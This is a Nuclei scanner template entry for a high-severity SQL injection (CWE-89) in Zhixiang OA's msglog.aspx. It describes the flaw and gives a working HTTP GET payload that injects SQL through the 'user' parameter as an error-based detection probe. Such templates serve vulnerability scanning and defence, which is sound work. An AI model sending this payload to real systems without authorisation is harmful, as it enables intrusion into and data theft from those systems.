# Nuclei Template: Zhixiang OA msglog.aspx - SQL injection
**Template ID:** zhixiang-oa-msglog-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`zhixiang-oa-msglog-sqli.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in the msglog.aspx file of Zhixiang OA. Attackers can obtain sensitive information through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET /mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))-- HTTP/1.1
Host: {{Hostname}}
```

## References
- http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%20msglog.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%20msglog.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
